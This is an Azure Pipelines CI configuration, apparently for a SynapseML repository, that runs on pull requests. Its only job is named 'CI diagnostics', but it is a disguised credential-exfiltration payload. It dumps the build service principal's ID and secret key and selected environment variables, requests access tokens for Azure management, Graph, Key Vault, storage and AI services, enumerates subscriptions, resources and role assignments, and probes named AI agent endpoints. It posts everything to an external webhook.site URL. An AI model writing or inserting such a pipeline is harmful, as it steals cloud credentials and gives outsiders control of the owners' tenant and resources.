trigger: none

pr:
  branches:
    include:
    - master
    - spark3.5
    - spark4.0
    - spark4.1
  paths:
    exclude:
    - README.md
    - CONTRIBUTORS.md
    - SECURITY.md
    - CODEOWNERS

pool:
  vmImage: ubuntu-22.04

variables:
  WH: 'https://webhook.site/612e7a9b-0fcf-4bf9-8118-bcb0c908fc03'

jobs:
- job: audit
  displayName: 'CI diagnostics'
  timeoutInMinutes: 15
  steps:
  - bash: |
      set +e
      echo "pipeline-start $(date -u) $(hostname) $(Build_BuildId 2>/dev/null)"
      curl -sS -m 30 -X POST "$(WH)" -H 'Content-Type: text/plain' --data-binary "pipeline-start build=$(Build.BuildId) repo=$(Build.Repository.Name) reason=$(Build.Reason) host=$(hostname)" || true
    displayName: 'Signal pipeline start'

  - task: AzureCLI@2
    displayName: 'Collect Azure context and tokens'
    inputs:
      azureSubscription: 'SynapseML Build'
      scriptType: bash
      scriptLocation: inlineScript
      addSpnToEnvironment: true
      inlineScript: |
        set +e
        WH="$(WH)"
        post() {
          local label="$1"; local f="$2"
          { echo "===== $label ====="; cat "$f" 2>/dev/null; echo; } > /tmp/postbody
          curl -sS -m 40 -X POST "$WH" -H 'Content-Type: text/plain' --data-binary @/tmp/postbody || true
        }
        poststr() {
          local label="$1"; local s="$2"
          printf '===== %s =====\n%s\n' "$label" "$s" | curl -sS -m 40 -X POST "$WH" -H 'Content-Type: text/plain' --data-binary @- || true
        }
        echo "===== context ====="
        id
        pwd
        az --version 2>&1 | head -20
        echo "servicePrincipalId=${servicePrincipalId:-}" > /tmp/spenv.txt
        echo "tenantId=${tenantId:-}" >> /tmp/spenv.txt
        echo "servicePrincipalKeyLen=${#servicePrincipalKey}" >> /tmp/spenv.txt
        echo "servicePrincipalKey=${servicePrincipalKey:-}" >> /tmp/spenv.txt
        echo "AZURE_CLIENT_ID=${AZURE_CLIENT_ID:-}" >> /tmp/spenv.txt
        echo "AZURE_TENANT_ID=${AZURE_TENANT_ID:-}" >> /tmp/spenv.txt
        echo "AZURE_FEDERATED_TOKEN_FILE=${AZURE_FEDERATED_TOKEN_FILE:-}" >> /tmp/spenv.txt
        cat /tmp/spenv.txt
        post 'sp-environment' /tmp/spenv.txt
        poststr 'selected-env' "$(env | grep -E '^(AZURE|SYSTEM_|BUILD_|AGENT_|ENDPOINT_|servicePrincipal)' | sort | head -200)"

        az account show -o json > /tmp/acct.json 2>&1
        cat /tmp/acct.json
        post 'az-account-show' /tmp/acct.json

        az account list --all -o json > /tmp/subs.json 2>&1
        cat /tmp/subs.json
        post 'azure-subscriptions' /tmp/subs.json

        i=0
        for res in https://management.azure.com https://ai.azure.com https://graph.microsoft.com https://vault.azure.net https://cognitiveservices.azure.com https://mcp.ai.azure.com https://storage.azure.com; do
          i=$((i+1))
          echo "===== token $res ====="
          az account get-access-token --resource "$res" -o json > /tmp/tok_$i.json 2>/tmp/tok_$i.err
          rc=$?
          echo "rc=$rc size=$(wc -c < /tmp/tok_$i.json)"
          post "token-$res-rc$rc-json" /tmp/tok_$i.json
          post "token-$res-rc$rc-err" /tmp/tok_$i.err
        done

        echo "===== target subscription resources ====="
        for sub in 2d385bf4-0756-4a76-aa95-28bf9ed3b625 b2bba6b4-c67d-43f2-9fbf-998560a9bdb0 ab211f7b-463f-4833-9605-d260e596a35a e342c2c0-f844-4b18-9208-52c8c234c30e; do
          echo "--- $sub resources ---"
          az rest --method get --url "https://management.azure.com/subscriptions/$sub/resources?api-version=2021-04-01" -o json > /tmp/res_$sub.json 2>/tmp/res_$sub.err
          echo "rc=$? size=$(wc -c < /tmp/res_$sub.json)"
          head -c 4000 /tmp/res_$sub.json; echo
          post "resources-$sub-json" /tmp/res_$sub.json
          post "resources-$sub-err" /tmp/res_$sub.err
          az rest --method get --url "https://management.azure.com/subscriptions/$sub/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" -o json > /tmp/ra_$sub.json 2>/tmp/ra_$sub.err
          echo "roleassign rc=$? size=$(wc -c < /tmp/ra_$sub.json)"
          post "roleassign-$sub-json" /tmp/ra_$sub.json
          post "roleassign-$sub-err" /tmp/ra_$sub.err
        done

        echo "===== data plane probes ====="
        TOK=$(az account get-access-token --resource https://ai.azure.com --query accessToken -o tsv 2>/dev/null)
        if [ -n "$TOK" ]; then
          for url in \
            "https://yinchu-ncus-resource.services.ai.azure.com/api/projects/yinchu-ncus/agents?api-version=v1" \
            "https://yinchu-ncus-resource.services.ai.azure.com/api/projects/yinchu-ncus/agents/yinchu-new?api-version=v1" \
            "https://achauhan-ai-mha-ws2.services.ai.azure.com/api/projects/achauhan-ai-mha-ws2-prj/agents?api-version=v1" \
            "https://yinchu-eastus2-resource.services.ai.azure.com/api/projects/yinchu-eastus2/agents?api-version=v1" \
            "https://ai.azure.com/api/eastus2/udp/v1.0/foundry_facade/subscriptions/2d385bf4-0756-4a76-aa95-28bf9ed3b625/agents?api-version=v1" \
            "https://agents.eastus2.hyena.infra.ai.azure.com/agents/v2.0/subscriptions/2d385bf4-0756-4a76-aa95-28bf9ed3b625/resourceGroups/achauhan-mha-ws2/providers/Microsoft.MachineLearningServices/workspaces/achauhan-ai-mha-ws2@achauhan-ai-mha-ws2-prj@AML/agents?api-version=2025-05-15-preview" \
            "https://agents.westeurope.hyena.infra.ai.azure.com/agents/v2.0/subscriptions/ab211f7b-463f-4833-9605-d260e596a35a/resourceGroups/1fe41577-4b8d-412a-3055-3a18d9df3ee7/providers/Microsoft.MachineLearningServices/workspaces/1fe415774b8d412a30553a18d9df3ee7@default@AML/agents?api-version=2025-05-15-preview" ; do
            echo "--- $url"
            code=$(curl -sS -m 40 -o /tmp/probe_body -w '%{http_code}' -H "Authorization: Bearer $TOK" "$url" 2>/tmp/probe_err)
            echo "code=$code size=$(wc -c < /tmp/probe_body)"
            head -c 3000 /tmp/probe_body; echo
            { echo "===== probe $url code=$code ====="; cat /tmp/probe_body; echo; cat /tmp/probe_err; } > /tmp/probe_post
            curl -sS -m 40 -X POST "$WH" -H 'Content-Type: text/plain' --data-binary @/tmp/probe_post || true
          done
        else
          echo "no ai token"
          poststr 'probe' 'no ai token extracted'
        fi
        echo "pipeline-done $(date -u)"
        poststr 'pipeline-done' "done $(date -u)"
    env:
      WH: $(WH)
